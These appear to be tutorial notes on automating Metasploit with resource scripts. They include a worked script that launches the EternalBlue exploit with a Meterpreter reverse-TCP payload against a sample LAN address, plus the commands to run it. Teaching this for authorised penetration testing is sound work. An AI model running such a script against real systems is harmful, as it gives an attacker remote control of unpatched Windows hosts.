This section focused on using **Resource Scripts** (`.rc` files) to automate repetitive tasks and complex multi-step attacks within the Metasploit Framework. This is crucial for efficiency, consistency, and for running pre-configured attack sequences.

---

### **1. Core Concept: What is a Resource Script?**

A Resource Script (`.rc` file) is a plain text file that contains a series of Metasploit console commands. Instead of typing commands one by one interactively, you can tell Metasploit to "source" or run the script, executing all the commands inside it automatically and sequentially.

**Why Use Them?**

- **Efficiency:** Automates the setup of modules, options, and payloads.
    
- **Consistency:** Ensures the same commands are run the same way every time, reducing human error.
    
- **Automation:** Perfect for post-exploitation scripts that run a set of modules after gaining a shell.
    
- **Reusability:** Scripts can be saved and used across different engagements.
    

---

### **2. How to Create and Utilize Resource Scripts**

#### **Step 1: Creating the Script File**

You can create a `.rc` file with any text editor (e.g., `nano`, `vim`, `gedit`, or even `echo`).

**Example: Creating a simple script**

# Create and edit a new file called 'auto_exploit.rc'
```
nano auto_exploit.rc
```

#### **Step 2: Writing Commands in the Script**

Inside the file, you write commands **exactly as you would in the `msfconsole` prompt**. Comments can be added using the `#` symbol.

**Key Commands to Automate:**

- `use <exploit/module>`
    
- `set RHOSTS <target_ip>`
    
- `set LHOST <your_ip>`
    
- `set LPORT <your_port>`
    
- `set PAYLOAD <payload_path>`
    
- `set <OPTION> <value>`
    
- `exploit` or `run` (to launch the module)
    
- `sleep <seconds>` (to add a pause between commands)
    
- `jobs` (to manage running background jobs)
    

---

### **3. Practical Examples & How to Utilize Them**

#### **Example 1: Basic Single Exploit Automation**

**Scenario:** Automate the launch of a `windows/smb/ms17_010_eternalblue` exploit.

**File: `eternal_auto.rc`**
# This script automates the EternalBlue exploit
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_tcp
# Exploit in a foreground session
exploit
```

__________
## **How to Utilize:**  
Start `msfconsole` and pass the script as an argument, or run it from inside the console.

# Method 1: Run the script when starting msfconsole
```
msfconsole -r eternal_auto.rc
```
# Method 2: Run the script from inside msfconsole

```
msf6 > resource eternal_auto.rc
```

_______
### **4. Key Flags & Best Practices for Utilization**

- **`-r` flag:** The primary flag for utilizing a resource script when starting `msfconsole`.
    
- **`resource` command:** The command to run a script from inside an active `msfconsole` session.
    
- **`setg` command:** Use **`setg`** (Set Global) instead of `set` for options that should apply to all modules (like `LHOST`, `LHOST`). This prevents you from having to set them repeatedly in a complex script.
    
- **Error Handling:** Metasploit will generally continue executing the script even if one command fails. Use `check` commands where possible to verify a target is vulnerable before exploiting.
    
- **Session Management:** Use `sessions -l` and `sessions -i <id>` in your scripts to interact with specific shells, especially when dealing with multiple targets.